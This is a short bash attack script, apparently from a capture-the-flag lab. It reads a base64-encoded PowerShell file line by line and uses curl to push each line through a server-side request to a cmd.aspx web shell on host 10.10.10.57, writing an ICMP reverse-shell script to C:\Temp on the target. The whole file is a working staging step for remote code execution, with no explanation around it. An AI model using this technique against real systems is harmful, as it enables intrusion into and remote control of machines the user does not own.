#!/bin/bash
export IFS=$'\n'

for line in $(cat icmp.ps1.b64);do

	arrow="echo ${line} >> C:\Temp\arrow-shelll.ps1"
	#echo $arrow
	curl -v -G --url http://10.10.10.57:62696/test.asp?u=http://127.0.0.1/cmd.aspx --data-urlencode "xcmd=$arrow"
	# echo $i
done
